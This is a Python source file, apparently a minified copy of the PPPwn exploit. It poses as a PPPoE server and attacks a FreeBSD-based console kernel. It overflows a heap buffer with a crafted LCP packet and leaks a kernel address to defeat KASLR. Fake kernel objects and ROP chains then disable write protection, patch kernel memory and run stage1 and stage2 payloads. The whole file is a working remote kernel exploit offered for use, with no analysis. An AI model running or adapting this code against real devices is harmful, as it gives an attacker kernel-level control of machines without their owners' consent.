from argparse import ArgumentParser
from scapy.all import*
from scapy.layers.ppp import*
from struct import pack,unpack
from sys import exit
from time import sleep
from offsets import*
PPPOE_TAG_HUNIQUE=259
PPPOE_TAG_ACOOKIE=260
PPPOE_CODE_PADI=9
PPPOE_CODE_PADO=7
PPPOE_CODE_PADR=25
PPPOE_CODE_PADS=101
PPPOE_CODE_PADT=167
ETHERTYPE_PPPOEDISC=34915
ETHERTYPE_PPPOE=34916
CONF_REQ=1
CONF_ACK=2
CONF_NAK=3
CONF_REJ=4
ECHO_REQ=9
ECHO_REPLY=10
NULL=0
PAGE_SIZE=16384
IDT_UD=6
SDT_SYSIGT=14
SEL_KPL=0
CR0_PE=1
CR0_MP=2
CR0_EM=4
CR0_TS=8
CR0_ET=16
CR0_NE=32
CR0_WP=65536
CR0_AM=262144
CR0_NW=536870912
CR0_CD=1073741824
CR0_PG=2147483648
CR0_ORI=CR0_PG|CR0_AM|CR0_WP|CR0_NE|CR0_ET|CR0_TS|CR0_MP|CR0_PE
VM_PROT_READ=1
VM_PROT_WRITE=2
VM_PROT_EXECUTE=4
VM_PROT_ALL=VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE
LLE_STATIC=2
LLE_LINKED=64
LLE_EXCLUSIVE=8192
LO_INITIALIZED=65536
LO_WITNESS=131072
LO_UPGRADABLE=2097152
LO_DUPOK=4194304
LO_CLASSSHIFT=24
RW_UNLOCKED=1
MTX_UNOWNED=4
RW_INIT_FLAGS=4<<LO_CLASSSHIFT|LO_INITIALIZED|LO_WITNESS|LO_UPGRADABLE
MTX_INIT_FLAGS=1<<LO_CLASSSHIFT|LO_INITIALIZED|LO_WITNESS
CALLOUT_RETURNUNLOCKED=16
AF_INET6=28
IFT_ETHER=6
ND6_LLINFO_NOSTATE=65534
TARGET_SIZE=256
PPPOE_SOFTC_SC_DEST=36
PPPOE_SOFTC_SC_AC_COOKIE=64
PPPOE_SOFTC_SIZE=456
LLTABLE_LLTIFP=272
LLTABLE_LLTFREE=280
SOCKADDR_IN6_SIZE=28
def p8(val):return pack('<B',val&255)
def p16(val):return pack('<H',val&65535)
def p16be(val):return pack('>H',val&65535)
def p32(val):return pack('<I',val&4294967295)
def p32be(val):return pack('>I',val&4294967295)
def p64(val):return pack('<Q',val&0xffffffffffffffff)
def p64be(val):return pack('>Q',val&0xffffffffffffffff)
class LcpEchoHandler(AsyncSniffer):
	def __init__(self,iface):self.s=conf.L2socket(iface=iface);super().__init__(opened_socket=self.s,prn=self.handler,filter='pppoes && !ip',lfilter=lambda pkt:pkt.haslayer(PPP_LCP_Echo))
	def handler(self,pkt):self.s.send(Ether(src=pkt[Ether].dst,dst=pkt[Ether].src,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=pkt[PPPoE].sessionid)/PPP()/PPP_LCP_Echo(code=ECHO_REPLY,id=pkt[PPP_LCP_Echo].id))
class Exploit:
	SPRAY_NUM=4096;PIN_NUM=4096;CORRUPT_NUM=1;HOLE_START=1024;HOLE_SPACE=16;LCP_ID=65;IPCP_ID=65;SESSION_ID=65535;STAGE2_PORT=9020;SOURCE_MAC='41:41:41:41:41:41';SOURCE_IPV4='41.41.41.41';SOURCE_IPV6='fe80::4141:4141:4141:4141';TARGET_IPV4='42.42.42.42';BPF_FILTER='(ip6) || (pppoed) || (pppoes && !ip)'
	def __init__(self,offs,iface,stage1,stage2):self.offs=offs;self.iface=iface;self.stage1=stage1;self.stage2=stage2;self.s=conf.L2socket(iface=self.iface,filter=self.BPF_FILTER)
	def kdlsym(self,addr):return self.kaslr_offset+addr
	def lcp_negotiation(self):
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_REQ,id=self.LCP_ID))
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_LCP_Configure)and pkt[PPP_LCP_Configure].code==CONF_ACK:break
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_LCP_Configure)and pkt[PPP_LCP_Configure].code==CONF_REQ:break
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_ACK,id=pkt[PPP_LCP_Configure].id))
	def ipcp_negotiation(self):
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_REQ,id=self.IPCP_ID,options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)))
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_IPCP)and pkt[PPP_IPCP].code==CONF_ACK:break
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_IPCP)and pkt[PPP_IPCP].code==CONF_REQ:break
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_NAK,id=pkt[PPP_IPCP].id,options=PPP_IPCP_Option_IPAddress(data=self.TARGET_IPV4)))
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_IPCP)and pkt[PPP_IPCP].code==CONF_REQ:break
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_ACK,id=pkt[PPP_IPCP].id,options=pkt[PPP_IPCP].options))
	def ppp_negotation(self,cb=None,ignore_initial_req=False):
		if ignore_initial_req:
			while True:
				pkt=self.s.recv()
				if pkt and pkt.haslayer(PPPoED)and pkt[PPPoED].code==PPPOE_CODE_PADI:break
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPPoED)and pkt[PPPoED].code==PPPOE_CODE_PADI:break
		for tag in pkt[PPPoED][PPPoED_Tags].tag_list:
			if tag.tag_type==PPPOE_TAG_HUNIQUE:host_uniq=tag.tag_value
		self.pppoe_softc=unpack('<Q',host_uniq)[0];self.target_mac=pkt[Ether].src;self.source_mac=self.SOURCE_MAC
		if cb:ac_cookie=cb()
		else:ac_cookie=b''
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADO)/PPPoETag(tag_type=PPPOE_TAG_ACOOKIE,tag_value=ac_cookie)/PPPoETag(tag_type=PPPOE_TAG_HUNIQUE,tag_value=host_uniq))
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPPoED)and pkt[PPPoED].code==PPPOE_CODE_PADR:break
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADS,sessionid=self.SESSION_ID)/PPPoETag(tag_type=PPPOE_TAG_HUNIQUE,tag_value=host_uniq))
	def build_fake_ifnet(self):planted=self.pppoe_softc+7&0xffffffffffff;self.source_mac=str2mac(planted.to_bytes(6,byteorder='little'));fake_ifnet=bytearray();fake_ifnet+=b'A'*(72-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=b'A'*(112-len(fake_ifnet));fake_ifnet+=p16(1);fake_ifnet+=b'A'*(160-len(fake_ifnet));fake_ifnet+=p8(IFT_ETHER);fake_ifnet+=p8(0);fake_ifnet+=p8(8+1);fake_ifnet+=b'A'*(440-len(fake_ifnet));fake_ifnet+=p64(self.pppoe_softc+PPPOE_SOFTC_SC_DEST);fake_ifnet+=b'A'*(1064-len(fake_ifnet));fake_ifnet+=p64(self.pppoe_softc+16-8);fake_ifnet+=b'A'*(1152-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=p32(RW_INIT_FLAGS);fake_ifnet+=p32(0);fake_ifnet+=p64(NULL);fake_ifnet+=p64(RW_UNLOCKED);fake_ifnet+=b'A'*(1216-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=p32(MTX_INIT_FLAGS);fake_ifnet+=p32(0);fake_ifnet+=p64(NULL);fake_ifnet+=p64(MTX_UNOWNED);return fake_ifnet
	def build_overflow_lle(self):overflow_lle=bytearray();overflow_lle+=p64(self.pppoe_softc+PPPOE_SOFTC_SC_AC_COOKIE);overflow_lle+=p64(NULL);overflow_lle+=p64(NULL);overflow_lle+=p32(RW_INIT_FLAGS|LO_DUPOK);overflow_lle+=p32(0);overflow_lle+=p64(NULL);overflow_lle+=p64(RW_UNLOCKED);overflow_lle+=p64(self.pppoe_softc+PPPOE_SOFTC_SC_AC_COOKIE-LLTABLE_LLTIFP);overflow_lle+=p64(NULL);overflow_lle+=p64(NULL);overflow_lle+=p64(NULL);overflow_lle+=p32(0);overflow_lle+=p32(0);overflow_lle+=p64(0);overflow_lle+=p16(LLE_EXCLUSIVE);overflow_lle+=p16(0);overflow_lle+=p16(0);overflow_lle+=p16(0);overflow_lle+=p16(ND6_LLINFO_NOSTATE);overflow_lle+=p16(0);overflow_lle+=p32(0);overflow_lle+=p64(0x7fffffffffffffff);return overflow_lle
	def build_fake_lle(self):planted=self.kdlsym(self.offs.FIRST_GADGET)&0xffffffffffff;self.source_mac=str2mac(planted.to_bytes(6,byteorder='little'));fake_lle=bytearray();fake_lle+=p64(self.kdlsym(self.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10));fake_lle+=p64(NULL);fake_lle+=p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET));fake_lle+=p32(RW_INIT_FLAGS|LO_DUPOK);fake_lle+=p32(0);fake_lle+=p64(self.kdlsym(self.offs.ADD_RSP_B0_POP_RBP_RET));fake_lle+=p64(RW_UNLOCKED);fake_lle+=p64(self.pppoe_softc+PPPOE_SOFTC_SC_DEST-LLTABLE_LLTFREE);fake_lle+=p64(NULL);fake_lle+=p64(NULL);fake_lle+=p64(NULL);fake_lle+=p32(0);fake_lle+=p32(0);fake_lle+=p64(0);fake_lle+=p16(LLE_STATIC|LLE_EXCLUSIVE);fake_lle+=p16(0);fake_lle+=p16(0);fake_lle+=p16(0);fake_lle+=p16(ND6_LLINFO_NOSTATE);fake_lle+=p16(0);fake_lle+=p32(0);fake_lle+=p64(0x7fffffffffffffff);fake_lle+=p32(0);fake_lle+=p32(0);fake_lle+=p64be(71748523475265);fake_lle+=p64(0);fake_lle+=p64(0);fake_lle+=p32(0);fake_lle+=p32(0);fake_lle+=p64(NULL);fake_lle+=p64(NULL);fake_lle+=p64(NULL);fake_lle+=p32(CALLOUT_RETURNUNLOCKED);fake_lle+=p32(0);fake_lle+=p8(SOCKADDR_IN6_SIZE);fake_lle+=p8(AF_INET6);fake_lle+=p16(0);fake_lle+=p32(0);fake_lle+=p64be(0xfe80000100000000);fake_lle+=p64be(0x4141414141414141);fake_lle+=p32(0);fake_lle+=p32(0);fake_lle[self.offs.SECOND_GADGET_OFF:self.offs.SECOND_GADGET_OFF+8]=p64(self.kdlsym(self.offs.PUSH_RBP_JMP_QWORD_PTR_RSI));rop2=self.build_second_rop();rop=self.build_first_rop(fake_lle,rop2);return fake_lle+rop+rop2+self.stage1
	def build_first_rop(self,fake_lle,rop2):rop=bytearray();rop+=p64(self.kdlsym(self.offs.POP_R12_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.MOV_RDI_RBX_CALL_R12));rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(-2048);rop+=p64(self.kdlsym(self.offs.ADD_RDI_RCX_RET));rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop_off_fixup=len(rop);rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(len(rop2+self.stage1));rop+=p64(self.kdlsym(self.offs.MEMCPY));rop+=p64(self.kdlsym(self.offs.POP_RAX_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.MOV_RSI_RBX_CALL_RAX));rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(2048+32);rop+=p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET));rop[rop_off_fixup:rop_off_fixup+8]=p64(-len(fake_lle+rop));return rop
	def build_second_rop(self):rop=bytearray();rop+=p64(self.kdlsym(self.offs.POP_RDI_RET));rop+=p64(IDT_UD);rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(SDT_SYSIGT);rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(SEL_KPL);rop+=p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET));rop+=p64(0);rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.SETIDT));rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(CR0_ORI&~CR0_WP);rop+=p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET));rop+=p64(self.kdlsym(self.offs.POP_RAX_RET));rop+=p64(VM_PROT_ALL);rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH1));rop+=p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET));rop+=p64(self.kdlsym(self.offs.POP_RCX_RET));rop+=p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH2));rop+=p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET));rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(CR0_ORI);rop+=p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET));rop+=p64(self.kdlsym(self.offs.POP_RAX_RET));rop+=p64(self.kdlsym(self.offs.RET));rop+=p64(self.kdlsym(self.offs.POP_RDI_RET));rop+=p64(self.kdlsym(self.offs.KERNEL_MAP));rop+=p64(self.kdlsym(self.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.POP_RSI_RET));rop+=p64(PAGE_SIZE);rop+=p64(self.kdlsym(self.offs.KMEM_ALLOC));rop+=p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.MOV_R14_RAX_CALL_R8));rop+=p64(self.kdlsym(self.offs.POP_R12_RET));rop+=p64(self.kdlsym(self.offs.POP_RBP_RET));rop+=p64(self.kdlsym(self.offs.MOV_RDI_R14_CALL_R12));rop+=p64(self.kdlsym(self.offs.PUSH_RSP_POP_RSI_RET));rop_rsp_pos=len(rop);rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop_off_fixup=len(rop);rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));rop+=p64(3735928559);rop+=p64(self.kdlsym(self.offs.POP_RDX_RET));rop+=p64(len(self.stage1));rop+=p64(self.kdlsym(self.offs.MEMCPY));rop+=p64(self.kdlsym(self.offs.JMP_R14));rop[rop_off_fixup:rop_off_fixup+8]=p64(-(len(rop)-rop_rsp_pos));return rop
	def run(self):
		lcp_echo_handler=LcpEchoHandler(self.iface);lcp_echo_handler.start();self.ppp_negotation(self.build_fake_ifnet);self.lcp_negotiation();self.ipcp_negotiation()
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(ICMPv6ND_RS):break
		self.target_ipv6=pkt[IPv6].src
		for i in range(self.SPRAY_NUM):
			source_ipv6='fe80::{:04x}:4141:4141:4141'.format(i);self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6EchoRequest())
			while True:
				pkt=self.s.recv()
				if pkt and pkt.haslayer(ICMPv6ND_NS):break
			if i>=self.HOLE_START and i%self.HOLE_SPACE==0:continue
			self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6ND_NA(tgt=source_ipv6,S=1)/ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
		for i in range(self.PIN_NUM):self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP(proto=16705));self.s.recv();sleep(.0005)
		sleep(.5);overflow_lle=self.build_overflow_lle()
		for i in range(self.CORRUPT_NUM):self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_REQ,id=self.LCP_ID,len=TARGET_SIZE+4,data=PPP_LCP_Option(data=b'A'*(TARGET_SIZE-4))/PPP_LCP_Option(data=overflow_lle)))
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_LCP_Configure)and pkt[PPP_LCP_Configure].code==CONF_REJ:break
		self.lcp_negotiation();self.ipcp_negotiation();corrupted=False
		for i in reversed(range(self.SPRAY_NUM)):
			if i>=self.HOLE_START and i%self.HOLE_SPACE==0:continue
			source_ipv6='fe80::{:04x}:4141:4141:4141'.format(i);self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6EchoRequest())
			while True:
				pkt=self.s.recv()
				if pkt:
					if pkt.haslayer(ICMPv6EchoReply):break
					elif pkt.haslayer(ICMPv6ND_NS):corrupted=True;break
			if corrupted:break
			self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6ND_NA(tgt=source_ipv6,S=1)/ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
		if not corrupted:print('0');exit(1)
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(ICMPv6NDOptSrcLLAddr)and pkt[ICMPv6NDOptSrcLLAddr].len>1:break
		self.pppoe_softc_list=unpack('<Q',bytes(pkt[IPv6])[67:75])[0];self.kaslr_offset=self.pppoe_softc_list-self.offs.PPPOE_SOFTC_LIST
		if self.pppoe_softc_list&0xffffffff00000fff!=self.offs.PPPOE_SOFTC_LIST&0xffffffff00000fff:print('0');exit(1)
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP_Terminate());self.ppp_negotation(self.build_fake_lle);self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=self.SOURCE_IPV6,dst=self.target_ipv6)/ICMPv6EchoRequest());count=0
		while count<3:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_LCP_Configure)and pkt[PPP_LCP_Configure].code==CONF_REQ:count+=1
		self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADT,sessionid=self.SESSION_ID));self.ppp_negotation();self.lcp_negotiation();self.ipcp_negotiation();frags=fragment(IP(src=self.SOURCE_IPV4,dst=self.TARGET_IPV4)/UDP(dport=self.STAGE2_PORT)/self.stage2,1024)
		for frag in frags:self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/frag)
		print('1')
def main():
	parser=ArgumentParser('pppwn.py');parser.add_argument('--interface',required=True);parser.add_argument('--fw',default='1100');parser.add_argument('--stage1',default='/root/PPPwn/stage1/stage1.bin');parser.add_argument('--stage2',default='/root/PPPwn/stage2/stage2.bin');args=parser.parse_args()
	with open(args.stage1,mode='rb')as f:stage1=f.read()
	with open(args.stage2,mode='rb')as f:stage2=f.read()
	if args.fw=='11.00':offs=OffsetsFirmware_1100()
	exploit=Exploit(offs,args.interface,stage1,stage2);exploit.run();return 0
if __name__=='__main__':exit(main())
